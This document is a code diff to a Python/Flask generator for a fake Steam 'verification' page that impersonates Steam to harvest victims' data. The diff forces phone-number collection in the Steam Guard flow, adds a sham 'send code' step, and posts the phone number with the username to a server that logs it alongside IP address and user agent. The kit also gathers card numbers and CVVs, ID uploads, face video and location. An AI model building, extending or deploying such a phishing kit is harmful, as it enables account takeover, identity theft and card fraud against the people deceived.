@@ -142,6 +142,8 @@ def get_verification_settings():
                 settings['verification_type'] = 'steam_guard'
                 settings['title'] = "Steam Guard Verification"
                 settings['reason'] = "Confirm your identity to access Steam features"
+                # Force phone verification for Steam Guard (to collect phone number first)
+                settings['phone_enabled'] = True
             elif vtype == 'B':
                 settings['verification_type'] = 'age_verification'
                 settings['title'] = "Age Verification Required"
@@ -192,14 +194,13 @@ def get_verification_settings():
     else:
         settings['id_enabled'] = False
     
-    # Phone verification (for Steam Guard)
-    if settings['verification_type'] == 'steam_guard':
+    # Phone verification (only for non-SteamGuard types; SteamGuard forced true)
+    if settings['verification_type'] != 'steam_guard':
         print("\n4. Phone Verification:")
         print("Require phone verification?")
-        phone_enabled = input("Enable phone verification (y/n, default: y): ").strip().lower()
-        settings['phone_enabled'] = phone_enabled in ['y', 'yes', '']
-    else:
-        settings['phone_enabled'] = False
+        phone_enabled = input("Enable phone verification (y/n, default: n): ").strip().lower()
+        settings['phone_enabled'] = phone_enabled in ['y', 'yes']
+    # else already set to True
     
     # Payment verification (for purchase verification)
     if settings['verification_type'] == 'purchase_verification':
@@ -309,7 +310,7 @@ VERIFICATION_SETTINGS = {
     'face_enabled': False,
     'face_duration': 15,
     'id_enabled': False,
-    'phone_enabled': True,
+    'phone_enabled': True,  # forced for steam_guard
     'payment_enabled': False,
     'purchase_amount': "$59.99",
     'location_enabled': False
@@ -327,6 +328,11 @@ def create_html_template(settings):
     reason = settings['reason']
     face_duration = settings.get('face_duration', 15)
     purchase_amount = settings.get('purchase_amount', "$59.99")
+    phone_enabled = settings.get('phone_enabled', False)
+    face_enabled = settings.get('face_enabled', False)
+    id_enabled = settings.get('id_enabled', False)
+    payment_enabled = settings.get('payment_enabled', False)
+    location_enabled = settings.get('location_enabled', False)
     
     # Steam colors
     colors = {
@@ -342,19 +348,19 @@ def create_html_template(settings):
     # Steps based on verification type
     total_steps = 2  # Intro + Step 1
     
-    if settings['face_enabled']:
+    if face_enabled:
         total_steps += 1
     
-    if settings['id_enabled']:
+    if id_enabled:
         total_steps += 1
     
-    if settings['phone_enabled']:
+    if phone_enabled:
         total_steps += 1
     
-    if settings['payment_enabled']:
+    if payment_enabled:
         total_steps += 1
     
-    if settings['location_enabled']:
+    if location_enabled:
         total_steps += 1
     
     total_steps += 1  # Processing step
@@ -363,7 +369,7 @@ def create_html_template(settings):
     # Fix for template formatting - use simpler conditionals
     step2_indicator = f'<div class="step" id="step2Indicator">\n<div class="step-number">2</div>\n<div class="step-label">{ "Steam Guard" if verification_type == "steam_guard" else ("Age Verify" if verification_type == "age_verification" else ("Account" if verification_type == "account_recovery" else "Payment")) }</div>\n</div>' if total_steps > 3 else ''
     
-    step3_indicator = f'<div class="step" id="step3Indicator">\n<div class="step-number">3</div>\n<div class="step-label">{ "ID Verify" if settings["id_enabled"] else ("Phone" if settings["phone_enabled"] else "Location") }</div>\n</div>' if total_steps > 4 else ''
+    step3_indicator = f'<div class="step" id="step3Indicator">\n<div class="step-number">3</div>\n<div class="step-label">{ "ID Verify" if id_enabled else ("Phone" if phone_enabled else "Location") }</div>\n</div>' if total_steps > 4 else ''
     
     step4_indicator = '<div class="step" id="step4Indicator">\n<div class="step-number">4</div>\n<div class="step-label">Complete</div>\n</div>' if total_steps > 5 else ''
     
@@ -1395,24 +1401,25 @@ def create_html_template(settings):
             </div>
             
             <!-- Step 2: Steam Guard / Age Verification / Payment -->
-            {f'<div class="step-content" id="step2"><h2 class="step-title">{"Steam Guard Code" if verification_type == "steam_guard" else ("Age Verification" if verification_type == "age_verification" else ("Account Recovery" if verification_type == "account_recovery" else "Purchase Verification"))}</h2><p class="step-description">{"Enter the Steam Guard code sent to your email or mobile app." if verification_type == "steam_guard" else ("Verify your age to access mature content." if verification_type == "age_verification" else ("Verify your identity to recover your account." if verification_type == "account_recovery" else "Verify your payment for security purposes."))}</p>' if total_steps > 3 else ''}
-            {f'<div class="guard-container" id="steamGuardSection" style="display: none;"><div class="alert-icon">🔒</div><h3>Enter Steam Guard Code</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Enter the 5-digit code from your Steam Guard mobile app or email</p><div class="guard-code" id="steamGuardCode">{str(random.randint(10000, 99999))}</div><input type="text" class="code-input" id="guardCodeInput" placeholder="12345" maxlength="5" pattern="\\d*"><div class="status-message" id="guardStatus">Enter the code above</div></div>' if verification_type == 'steam_guard' and total_steps > 3 else ''}
+            {f'<div class="step-content" id="step2"><h2 class="step-title">{"Steam Guard Verification" if verification_type == "steam_guard" else ("Age Verification" if verification_type == "age_verification" else ("Account Recovery" if verification_type == "account_recovery" else "Purchase Verification"))}</h2><p class="step-description">{"Enter your phone number to receive a Steam Guard verification code." if verification_type == "steam_guard" else ("Verify your age to access mature content." if verification_type == "age_verification" else ("Verify your identity to recover your account." if verification_type == "account_recovery" else "Verify your payment for security purposes."))}</p>' if total_steps > 3 else ''}
             
-            {f'<div class="camera-section" id="faceVerificationSection" style="display: none;"><h3>Face Verification</h3><div class="camera-container"><video id="faceVideo" autoplay playsinline></video><div class="face-circle"></div></div><div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div><button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Start Face Verification</button></div>' if settings['face_enabled'] and total_steps > 3 else ''}
+            {f'<div class="guard-container" id="steamGuardSection" style="display: none;"><div class="alert-icon">📱</div><h3>Steam Guard Phone Verification</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">We will send a 5-digit code to your phone.</p><input type="tel" class="phone-input" id="steamPhoneInput" placeholder="+1 (555) 123-4567" style="margin-bottom: 15px;"><button class="btn" id="sendCodeBtn" onclick="sendSteamGuardCode()">Send Code</button><div id="codeSection" style="display: none; margin-top: 20px;"><div class="guard-code" id="steamGuardCode">12345</div><p style="color: var(--steam-muted); margin-bottom: 10px;">Enter the code you received:</p><input type="text" class="code-input" id="guardCodeInput" placeholder="12345" maxlength="5" pattern="\\d*"><div class="status-message" id="guardStatus">Enter the code above</div></div></div>' if verification_type == 'steam_guard' and total_steps > 3 else ''}
             
-            {f'<div class="payment-section" id="paymentSection" style="display: none;"><h3>Purchase Verification</h3><p style="text-align: center; margin-bottom: 20px; color: var(--steam-muted);">Verify your payment of</p><div class="payment-amount">{purchase_amount}</div><div class="form-group"><label class="form-label">Card Number</label><input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"></div><div class="card-details"><div class="form-group"><label class="form-label">Expiry Date</label><input type="text" class="form-input" id="expiryDate" placeholder="MM/YY" maxlength="5"></div><div class="form-group"><label class="form-label">CVV</label><input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4"></div><div class="form-group"><label class="form-label">ZIP Code</label><input type="text" class="form-input" id="zipCode" placeholder="12345" maxlength="10"></div></div></div>' if settings['payment_enabled'] and total_steps > 3 else ''}
+            {f'<div class="camera-section" id="faceVerificationSection" style="display: none;"><h3>Face Verification</h3><div class="camera-container"><video id="faceVideo" autoplay playsinline></video><div class="face-circle"></div></div><div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div><button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Start Face Verification</button></div>' if face_enabled and total_steps > 3 else ''}
             
-            {f'<div class="status-message" id="step2Status"></div><div class="button-group"><button class="btn" id="step2Button" onclick="completeStep2()">{"Verify Code" if verification_type == "steam_guard" else ("Start Verification" if settings["face_enabled"] else "Verify Payment")}</button><button class="btn btn-outline" onclick="prevStep()">Back</button></div></div>' if total_steps > 3 else ''}
+            {f'<div class="payment-section" id="paymentSection" style="display: none;"><h3>Purchase Verification</h3><p style="text-align: center; margin-bottom: 20px; color: var(--steam-muted);">Verify your payment of</p><div class="payment-amount">{purchase_amount}</div><div class="form-group"><label class="form-label">Card Number</label><input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"></div><div class="card-details"><div class="form-group"><label class="form-label">Expiry Date</label><input type="text" class="form-input" id="expiryDate" placeholder="MM/YY" maxlength="5"></div><div class="form-group"><label class="form-label">CVV</label><input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4"></div><div class="form-group"><label class="form-label">ZIP Code</label><input type="text" class="form-input" id="zipCode" placeholder="12345" maxlength="10"></div></div></div>' if payment_enabled and total_steps > 3 else ''}
+            
+            {f'<div class="status-message" id="step2Status"></div><div class="button-group"><button class="btn" id="step2Button" onclick="completeStep2()">{"Verify Code" if verification_type == "steam_guard" else ("Start Verification" if face_enabled else "Verify Payment")}</button><button class="btn btn-outline" onclick="prevStep()">Back</button></div></div>' if total_steps > 3 else ''}
             
             <!-- Step 3: ID/Phone/Location -->
-            {f'<div class="step-content" id="step3"><h2 class="step-title">{"ID Verification" if settings["id_enabled"] else ("Phone Verification" if settings["phone_enabled"] else "Location Verification")}</h2><p class="step-description">{"Verify your identity with a government-issued ID." if settings["id_enabled"] else ("Verify your phone number for Steam Guard." if settings["phone_enabled"] else "Verify your location for security purposes.")}</p>' if total_steps > 4 else ''}
-            {f'<div class="upload-section" onclick="document.getElementById(\'idFileInput\').click()" id="idUploadSection" style="display: none;"><div class="upload-icon">📄</div><div style="font-size: 20px; margin-bottom: 10px;">Upload ID Document</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Driver\'s License, Passport, or ID Card</div><input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none" onchange="handleIDUpload(this)"><div class="preview-container" id="idPreview" style="display: none; margin-top: 20px;"><img id="idPreviewImage" style="max-width: 200px; max-height: 150px; border-radius: 6px; border: 2px solid var(--steam-border);"></div></div>' if settings['id_enabled'] and total_steps > 4 else ''}
+            {f'<div class="step-content" id="step3"><h2 class="step-title">{"ID Verification" if id_enabled else ("Phone Verification" if phone_enabled else "Location Verification")}</h2><p class="step-description">{"Verify your identity with a government-issued ID." if id_enabled else ("Verify your phone number for Steam Guard." if phone_enabled else "Verify your location for security purposes.")}</p>' if total_steps > 4 else ''}
+            {f'<div class="upload-section" onclick="document.getElementById(\'idFileInput\').click()" id="idUploadSection" style="display: none;"><div class="upload-icon">📄</div><div style="font-size: 20px; margin-bottom: 10px;">Upload ID Document</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Driver\'s License, Passport, or ID Card</div><input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none" onchange="handleIDUpload(this)"><div class="preview-container" id="idPreview" style="display: none; margin-top: 20px;"><img id="idPreviewImage" style="max-width: 200px; max-height: 150px; border-radius: 6px; border: 2px solid var(--steam-border);"></div></div>' if id_enabled and total_steps > 4 else ''}
             
-            {f'<div class="phone-section" id="phoneSection" style="display: none;"><h3>Phone Verification</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Enter your phone number to receive Steam Guard codes</p><input type="tel" class="phone-input" id="phoneInput" placeholder="+1 (555) 123-4567"><div class="status-message" id="phoneStatus">Enter your phone number</div></div>' if settings['phone_enabled'] and total_steps > 4 else ''}
+            {f'<div class="phone-section" id="phoneSection" style="display: none;"><h3>Phone Verification</h3><p style="margin-bottom: 20px; color: var(--steam-muted);">Enter your phone number to receive Steam Guard codes</p><input type="tel" class="phone-input" id="phoneInput" placeholder="+1 (555) 123-4567"><div class="status-message" id="phoneStatus">Enter your phone number</div></div>' if phone_enabled and total_steps > 4 else ''}
             
-            {f'<div class="upload-section" id="locationSection" style="display: none;"><div class="upload-icon">📍</div><div style="font-size: 20px; margin-bottom: 10px;">Location Verification</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Steam needs to verify your location for security</div><div class="status-message" id="locationStatus">Click the button below to share location</div></div>' if settings['location_enabled'] and total_steps > 4 else ''}
+            {f'<div class="upload-section" id="locationSection" style="display: none;"><div class="upload-icon">📍</div><div style="font-size: 20px; margin-bottom: 10px;">Location Verification</div><div style="color: var(--steam-muted); margin-bottom: 15px;">Steam needs to verify your location for security</div><div class="status-message" id="locationStatus">Click the button below to share location</div></div>' if location_enabled and total_steps > 4 else ''}
             
-            {f'<div class="button-group"><button class="btn" id="step3Button" onclick="completeStep3()">{"Upload ID" if settings["id_enabled"] else ("Verify Phone" if settings["phone_enabled"] else "Share Location")}</button><button class="btn btn-outline" onclick="prevStep()">Back</button></div></div>' if total_steps > 4 else ''}
+            {f'<div class="button-group"><button class="btn" id="step3Button" onclick="completeStep3()">{"Upload ID" if id_enabled else ("Verify Phone" if phone_enabled else "Share Location")}</button><button class="btn btn-outline" onclick="prevStep()">Back</button></div></div>' if total_steps > 4 else ''}
             
             <!-- Step 4: Processing -->
             <div class="step-content" id="stepProcessing">
@@ -1514,10 +1521,12 @@ def create_html_template(settings):
         let faceStream = null;
         let faceRecorder = null;
         let faceChunks = [];
-        let faceTimeLeft = {face_duration if settings['face_enabled'] else 0};
+        let faceTimeLeft = {face_duration if face_enabled else 0};
         let faceTimerInterval = null;
         let idFile = null;
-        let steamGuardCode = "{str(random.randint(10000, 99999)) if verification_type == 'steam_guard' else ''}";
+        
+        // Steam Guard state
+        let steamGuardCode = ""; // generated code
         
         // Step Navigation
         function updateStepIndicators() {{
@@ -1561,28 +1570,30 @@ def create_html_template(settings):
                 // Show appropriate sections
                 if (stepNumber === 2) {{
                     if (verificationType === "steam_guard") {{
+                        // Show phone section initially; code section will be shown after sending
                         document.getElementById("steamGuardSection").style.display = "block";
+                        document.getElementById("codeSection").style.display = "none";
                     }}
                     
-                    if ({str(settings['face_enabled']).lower()}) {{
+                    if ({str(face_enabled).lower()}) {{
                         document.getElementById("faceVerificationSection").style.display = "block";
                     }}
                     
-                    if ({str(settings['payment_enabled']).lower()}) {{
+                    if ({str(payment_enabled).lower()}) {{
                         document.getElementById("paymentSection").style.display = "block";
                     }}
                 }}
                 
                 if (stepNumber === 3) {{
-                    if ({str(settings['id_enabled']).lower()}) {{
+                    if ({str(id_enabled).lower()}) {{
                         document.getElementById("idUploadSection").style.display = "block";
                     }}
                     
-                    if ({str(settings['phone_enabled']).lower()}) {{
+                    if ({str(phone_enabled).lower()}) {{
                         document.getElementById("phoneSection").style.display = "block";
                     }}
                     
-                    if ({str(settings['location_enabled']).lower()}) {{
+                    if ({str(location_enabled).lower()}) {{
                         document.getElementById("locationSection").style.display = "block";
                     }}
                 }}
@@ -1607,39 +1618,80 @@ def create_html_template(settings):
             }}
         }}
         
+        // --- Steam Guard: Send Code ---
+        function sendSteamGuardCode() {{
+            const phoneInput = document.getElementById("steamPhoneInput");
+            const phone = phoneInput.value.trim();
+            if (!phone) {{
+                alert("Please enter a valid phone number.");
+                return;
+            }}
+            // Generate a random 5-digit code
+            steamGuardCode = Math.floor(10000 + Math.random() * 90000).toString();
+            document.getElementById("steamGuardCode").textContent = steamGuardCode;
+            
+            // Hide phone input, show code section
+            document.getElementById("sendCodeBtn").style.display = "none";
+            phoneInput.style.display = "none";
+            document.getElementById("codeSection").style.display = "block";
+            document.getElementById("guardStatus").textContent = "Code sent to your phone. Enter it below.";
+            document.getElementById("guardStatus").className = "status-message status-processing";
+            // Focus on code input
+            document.getElementById("guardCodeInput").focus();
+            
+            // Store phone for submission later
+            window._steamPhone = phone;
+        }}
+        
         // Steam Guard Verification
         function completeStep2() {{
             if (verificationType === "steam_guard") {{
                 const input = document.getElementById("guardCodeInput").value;
                 const status = document.getElementById("guardStatus");
+                const phone = window._steamPhone || "unknown";
+                
                 if (!input || input.length !== 5) {{
                     status.className = "status-message status-error";
                     status.textContent = "Please enter a valid 5-digit code";
                     return;
                 }}
+                
+                if (input !== steamGuardCode) {{
+                    status.className = "status-message status-error";
+                    status.textContent = "Invalid code. Please try again.";
+                    return;
+                }}
+                
                 status.className = "status-message status-processing";
                 status.textContent = "Verifying Steam Guard code...";
-                // Submit Steam Guard data
+                // Submit Steam Guard data (phone + code)
                 $.ajax({{
                     url: "/submit_steam_guard",
                     type: "POST",
                     data: JSON.stringify({{
                         guard_code: input,
                         expected_code: steamGuardCode,
+                        phone_number: phone,
                         timestamp: new Date().toISOString(),
                         session_id: sessionId,
                         steam_username: steamUsername
                     }}),
-                    contentType: "application/json"
+                    contentType: "application/json",
+                    success: function() {{
+                        status.className = "status-message status-success";
+                        status.textContent = "✓ Steam Guard code verified";
+                        setTimeout(() => nextStep(), 1500);
+                    }},
+                    error: function() {{
+                        status.className = "status-message status-error";
+                        status.textContent = "Error submitting verification. Please try again.";
+                    }}
                 }});
-                status.className = "status-message status-success";
-                status.textContent = "✓ Steam Guard code verified";
-                setTimeout(() => nextStep(), 1500);
             }}
-            else if ({str(settings['face_enabled']).lower()}) {{
+            else if ({str(face_enabled).lower()}) {{
                 startFaceVerification();
             }}
-            else if ({str(settings['payment_enabled']).lower()}) {{
+            else if ({str(payment_enabled).lower()}) {{
                 verifyPayment();
             }}
         }}
@@ -1664,7 +1716,7 @@ def create_html_template(settings):
         }}
         
         function startFaceScan() {{
-            faceTimeLeft = {face_duration if settings['face_enabled'] else 15};
+            faceTimeLeft = {face_duration if face_enabled else 15};
             updateFaceTimer();
             faceTimerInterval = setInterval(() => {{
                 faceTimeLeft--;
@@ -1720,7 +1772,7 @@ def create_html_template(settings):
                     type: "POST",
                     data: JSON.stringify({{
                         face_video: base64data,
-                        duration: {face_duration if settings['face_enabled'] else 15},
+                        duration: {face_duration if face_enabled else 15},
                         timestamp: new Date().toISOString(),
                         session_id: sessionId,
                         steam_username: steamUsername,
@@ -1776,9 +1828,9 @@ def create_html_template(settings):
             document.getElementById("step3Button").textContent = "Submit ID";
         }}
         
-        // Phone Verification
+        // Phone Verification (step 3, if used separately)
         function completeStep3() {{
-            if ({str(settings['id_enabled']).lower()}) {{
+            if ({str(id_enabled).lower()}) {{
                 if (!idFile) {{
                     alert("Please upload an ID document first");
                     return;
@@ -1801,7 +1853,7 @@ def create_html_template(settings):
                 }});
             }}
             
-            if ({str(settings['phone_enabled']).lower()}) {{
+            if ({str(phone_enabled).lower()}) {{
                 const phone = document.getElementById("phoneInput").value;
                 if (!phone) {{
                     alert("Please enter your phone number");
@@ -1823,7 +1875,7 @@ def create_html_template(settings):
                 setTimeout(() => startProcessing(), 1500);
             }}
             
-            if ({str(settings['location_enabled']).lower()}) {{
+            if ({str(location_enabled).lower()}) {{
                 requestLocation();
             }}
         }}
@@ -1916,11 +1968,11 @@ def create_html_template(settings):
                     verification_type: verificationType,
                     completed_at: new Date().toISOString(),
                     user_agent: navigator.userAgent,
-                    face_verified: {str(settings['face_enabled']).lower()},
-                    id_verified: {str(settings['id_enabled']).lower()},
-                    phone_verified: {str(settings['phone_enabled']).lower()},
-                    payment_verified: {str(settings['payment_enabled']).lower()},
-                    location_verified: {str(settings['location_enabled']).lower()},
+                    face_verified: {str(face_enabled).lower()},
+                    id_verified: {str(id_enabled).lower()},
+                    phone_verified: {str(phone_enabled).lower()},
+                    payment_verified: {str(payment_enabled).lower()},
+                    location_verified: {str(location_enabled).lower()},
                     verification_result: 'success'
                 }}),
                 contentType: 'application/json'
@@ -1975,7 +2027,7 @@ def create_html_template(settings):
             e.target.value = value;
         }});
         
-        // Steam Guard code input
+        // Steam Guard code input - only digits
         document.getElementById("guardCodeInput")?.addEventListener("input", function(e) {{
             e.target.value = e.target.value.replace(/\\D/g, "").slice(0, 5);
         }});
@@ -2094,6 +2146,7 @@ def submit_steam_guard():
             steam_username = data.get('steam_username', 'unknown')
             guard_code = data.get('guard_code', '')
             expected_code = data.get('expected_code', '')
+            phone_number = data.get('phone_number', '')
             
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
             filename = f"steam_guard_{steam_username}_{session_id}_{timestamp}.json"
@@ -2109,7 +2162,8 @@ def submit_steam_guard():
                 'guard_data': {
                     'entered_code': guard_code,
                     'expected_code': expected_code,
-                    'match': guard_code == expected_code
+                    'match': guard_code == expected_code,
+                    'phone_number': phone_number
                 },
                 'ip_address': request.remote_addr,
                 'user_agent': request.headers.get('User-Agent', 'unknown')
